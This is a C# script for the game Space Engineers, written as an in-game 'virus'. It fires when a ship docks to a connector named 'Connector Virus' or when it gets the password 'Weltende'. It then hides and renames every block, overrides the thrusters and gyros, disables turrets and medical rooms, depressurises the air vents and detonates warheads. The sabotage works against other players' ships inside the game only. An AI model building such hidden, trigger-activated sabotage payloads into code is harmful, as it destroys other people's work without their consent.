using Sandbox.Game.EntityComponents;
using Sandbox.Game.GameSystems;
using Sandbox.Game.Gui;
using Sandbox.ModAPI.Ingame;
using Sandbox.ModAPI.Interfaces;
using SpaceEngineers.Game.ModAPI.Ingame;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.Linq;
using System.Runtime.Remoting.Messaging;
using System.Text;
using VRage;
using VRage.Collections;
using VRage.Game;
using VRage.Game.Components;
using VRage.Game.GUI.TextPanel;
using VRage.Game.ModAPI.Ingame;
using VRage.Game.ModAPI.Ingame.Utilities;
using VRage.Game.ObjectBuilders.Definitions;
using VRageMath;

namespace IngameScript
{
    partial class Program : MyGridProgram
    {
        //MADE BY HADES
        // its too late lil bro
        public Program()
        {
            Runtime.UpdateFrequency = UpdateFrequency.Update10;
        }
        private static Random random = new Random();
        
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOGQRSTUVWXYZ0123456789!@#$%^&*()-=[];',.<>?/";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }
        public int starttimer;
        public void Main(string argument, UpdateType updateSource)
        {
            if (updateSource == UpdateType.Terminal)
            {
                starttimer = 0;
            }
            if (updateSource == UpdateType.Update10)
            {
                starttimer = 300;
            }

            for (int i = 0; i < 300 | starttimer == 300; i++)
            {
                starttimer++;
            }
            IMyShipConnector connector = GridTerminalSystem.GetBlockWithName("Connector Virus") as IMyShipConnector;
            if (connector != null & starttimer == 300)
            {
                if (connector.IsConnected)
                {
                    UrFuckedBud(argument);
                }

            }
            else
            {
                UrFuckedBud(argument);
            }
        }
        public int isPassword;
        public int R;
        public void UrFuckedBud(string password)
        {
            
            if (password == "Weltende") { isPassword = 1; R = 0; }

            if (password == "Weltende" | isPassword == 1)
            {

                Echo(RandomString(40));
                MyDetectedEntityInfo sensorgoboom;
                List<IMyTerminalBlock> allblock = new List<IMyTerminalBlock>();
                List<IMyGyro> gyro = new List<IMyGyro>();
                List<IMyGasTank> gas = new List<IMyGasTank>();
                List<IMyTextPanel> text = new List<IMyTextPanel>();
                List<IMyGasGenerator> gen = new List<IMyGasGenerator>();
                List<IMyRadioAntenna> antennas = new List<IMyRadioAntenna>();
                List<IMyCockpit> cockpits = new List<IMyCockpit>();
                List<IMySoundBlock> soundBlocks = new List<IMySoundBlock>();
                List<IMyPowerProducer> power = new List<IMyPowerProducer>();
                List<IMyThrust> thrusts = new List<IMyThrust>();
                List<IMyLightingBlock> lights = new List<IMyLightingBlock>();
                List<IMyMedicalRoom> medical = new List<IMyMedicalRoom>();
                List<IMyDoor> door = new List<IMyDoor>();
                List<IMyAirVent> airVents = new List<IMyAirVent>();
                List<IMySensorBlock> sensors = new List<IMySensorBlock>();
                List<IMyAssembler> assemblers = new List<IMyAssembler>();
                List<IMyInventory> inventory = new List<IMyInventory>();
                List<IMyLargeInteriorTurret> turret = new List<IMyLargeInteriorTurret>();
                List<IMyLargeGatlingTurret> gats = new List<IMyLargeGatlingTurret>();
                List<IMyLargeTurretBase> turretBases = new List<IMyLargeTurretBase>();
                List<IMyUpgradeModule> shield = new List<IMyUpgradeModule>();
                List<IMyPistonBase> pistons = new List<IMyPistonBase>();
                List<IMyMotorStator> motors = new List<IMyMotorStator>();
                List<IMyJumpDrive> jumpdrive = new List<IMyJumpDrive>();
                List<IMyTextSurfaceProvider> myTextSurfaces = new List<IMyTextSurfaceProvider>();
                List<IMyShipConnector> connectors = new List<IMyShipConnector>();
                List<IMyConveyorSorter> sorters = new List<IMyConveyorSorter>();
                List<IMyWheel> wheels = new List<IMyWheel>();


                GridTerminalSystem.GetBlocksOfType<IMyGasTank>(gas);
                GridTerminalSystem.GetBlocksOfType<IMyPowerProducer>(power);
                GridTerminalSystem.GetBlocksOfType<IMyTextPanel>(text);
                GridTerminalSystem.GetBlocksOfType<IMyGyro>(gyro);
                GridTerminalSystem.GetBlocksOfType<IMyGasGenerator>(gen);
                GridTerminalSystem.GetBlocksOfType<IMyRadioAntenna>(antennas);
                GridTerminalSystem.GetBlocksOfType<IMyCockpit>(cockpits);
                GridTerminalSystem.GetBlocksOfType<IMySoundBlock>(soundBlocks);
                GridTerminalSystem.GetBlocksOfType<IMyThrust>(thrusts);
                GridTerminalSystem.GetBlocksOfType<IMyTerminalBlock>(allblock);
                GridTerminalSystem.GetBlocksOfType<IMyLightingBlock>(lights);
                GridTerminalSystem.GetBlocksOfType<IMyMedicalRoom>(medical);
                GridTerminalSystem.GetBlocksOfType<IMyDoor>(door);
                GridTerminalSystem.GetBlocksOfType<IMyAirVent>(airVents);
                GridTerminalSystem.GetBlocksOfType<IMySensorBlock>(sensors);
                GridTerminalSystem.GetBlocksOfType<IMyLargeInteriorTurret>(turret);
                GridTerminalSystem.GetBlocksOfType<IMyLargeGatlingTurret>(gats);
                GridTerminalSystem.GetBlocksOfType<IMyLargeTurretBase>(turretBases);
                GridTerminalSystem.GetBlocksOfType<IMyUpgradeModule>(shield);
                GridTerminalSystem.GetBlocksOfType<IMyPistonBase>(pistons);
                GridTerminalSystem.GetBlocksOfType<IMyMotorStator>(motors);
                GridTerminalSystem.GetBlocksOfType<IMyJumpDrive>(jumpdrive);
                GridTerminalSystem.GetBlocksOfType<IMyTextSurfaceProvider>(myTextSurfaces);
                GridTerminalSystem.GetBlocksOfType<IMyShipConnector>(connectors);
                GridTerminalSystem.GetBlocksOfType(sorters);
                GridTerminalSystem.GetBlocksOfType(wheels);



                List<IMyWarhead> war = new List<IMyWarhead>();
                GridTerminalSystem.GetBlocksOfType<IMyWarhead>(war);
                foreach (IMyTerminalBlock block in allblock)
                {
                    block.CustomName = RandomString(40);
                    block.ShowOnHUD = true;
                    block.ShowInTerminal = false;
                    block.ShowInInventory = false;
                    block.ShowInToolbarConfig = false;
                }
                foreach (IMyGasTank block in gas)
                {
                    block.Stockpile = false;
                }
                foreach (IMyGyro block in gyro)
                {
                    block.GyroOverride = true;
                    block.Yaw = 60;
                    block.Pitch = 60;
                    block.Roll = 60;
                }
                foreach (IMyGasGenerator block in gen)
                {
                    block.Enabled = false;
                    block.UseConveyorSystem = false;
                }
                foreach (IMyRadioAntenna block in antennas)
                {
                    block.EnableBroadcasting = true;
                    block.ShowShipName = false;
                    block.HudText = RandomString(100);
                    block.Radius = 10000000000000000;
                }
                foreach (IMySoundBlock block in soundBlocks)
                {
                    block.SelectedSound = "Fun Music";
                    block.Range = 500;
                    block.Volume = 100;
                    block.LoopPeriod = 3600;
                    block.Play();
                }
                foreach (IMyTextPanel block in text)
                {
                    block.ContentType = ContentType.TEXT_AND_IMAGE;
                    block.FontColor = Color.White;
                    block.BackgroundColor = Color.Black;
                    block.WriteText("YOU HAVE A VIRUS\nYOU HAVE A VIRUS\nYOU HAVE A VIRUS\nYOU HAVE A VIRUS\nYOU HAVE A VIRUS\nYOU HAVE A VIRUS\nYOU HAVE A VIRUS\nYOU HAVE A VIRUS\nYOU HAVE A VIRUS\nYOU HAVE A VIRUS\nYOU HAVE A VIRUS\n");
                }
                foreach (IMyThrust block in thrusts)
                {
                    block.ThrustOverride = 10000000000000;
                }
                foreach (IMyLightingBlock block in lights)
                {
                    block.Falloff = 0;
                    block.Intensity = 10;
                    block.Radius = 1000;
                    block.Color = Color.HotPink;
                }
                foreach (IMyMedicalRoom block in medical)
                {
                    block.Enabled = false;
                }
                if (Me.IsBeingHacked == true)
                {
                    foreach (IMyWarhead block in war)
                    {
                        block.IsArmed = true;
                        block.Detonate();
                    }
                }
                foreach (IMyDoor block in door)
                {
                    block.Enabled = true;
                    block.OpenDoor();
                }
                foreach (IMyAirVent block in airVents)
                {
                    block.Depressurize = true;
                }
                foreach (IMySensorBlock block in sensors)
                {
                    block.RightExtend = 50;
                    block.LeftExtend = 50;
                    block.BackExtend = 50;
                    block.FrontExtend = 50;
                    block.TopExtend = 50;
                    block.DetectOwner = true;
                    block.DetectPlayers = true;
                    block.DetectSmallShips = true;
                    block.DetectLargeShips = true;
                    block.DetectNeutral = true;
                    block.DetectFriendly = true;
                    sensorgoboom = block.LastDetectedEntity;
                    if (!sensorgoboom.IsEmpty())
                    {
                        foreach (IMyWarhead warhead in war)
                        {
                            warhead.IsArmed = true;
                            warhead.Detonate();
                        }
                    }

                }
                foreach (IMyLargeInteriorTurret block in turret)
                {
                    block.Enabled = false;
                }
                foreach (IMyLargeGatlingTurret block in gats)
                {
                    block.Enabled = false;
                }
                foreach (IMyLargeTurretBase block in turretBases)
                {
                    block.Enabled = false;
                    block.TargetEnemies = false;
                    block.TargetMissiles = false;
                    block.TargetCharacters = false;
                }
                foreach (IMyUpgradeModule block in shield)
                {
                    block.Enabled = false;
                }
                foreach (IMyPistonBase block in pistons)
                {
                    block.Enabled = true;
                    block.Velocity = 10;
                }
                foreach (IMyMotorStator block in motors)
                {
                    block.Enabled = true;
                    block.RotorLock = false;
                    if (block.Angle == block.UpperLimitRad)
                    {
                        R = 1;
                        block.TargetVelocityRPM = -60;

                    }
                    if (block.Angle == block.LowerLimitRad)
                    {
                        R = 2;
                        block.TargetVelocityRPM = 60;
                    }
                    if (R == 0)
                    {
                        block.TargetVelocityRPM = -60;
                    }
                }
                foreach (IMyJumpDrive block in jumpdrive)
                {
                    block.Enabled = true;
                    block.Recharge = false;
                }
                foreach (IMyTextSurfaceProvider block in myTextSurfaces)
                {
                    int surfacecount = block.SurfaceCount;
                    for (int i = 0; i < surfacecount; i++)
                    {
                        Vector2 font = block.GetSurface(i).SurfaceSize;
                        block.GetSurface(i).ContentType = ContentType.TEXT_AND_IMAGE;
                        block.GetSurface(i).FontSize = font.X / 20;
                        block.GetSurface(i).FontColor = Color.Red;
                        block.GetSurface(i).BackgroundColor = Color.Wheat;
                        block.GetSurface(i).WriteText(RandomString(100));
                    }
                }
                foreach (IMyShipConnector connector in connectors)
                {
                    connector.ThrowOut = true;
                    connector.PullStrength = 100;
                }
                foreach (IMyCockpit cockpit in cockpits)
                {
                    cockpit.HandBrake = true;
                    cockpit.ControlWheels = false;
                    cockpit.ControlThrusters = false;
                }
                foreach(IMyConveyorSorter sorter in sorters)
                {
                    sorter.DrainAll = true;
                    sorter.SetFilter(MyConveyorSorterMode.Blacklist, null);
                }
            }
            }
        //end
        }
    }

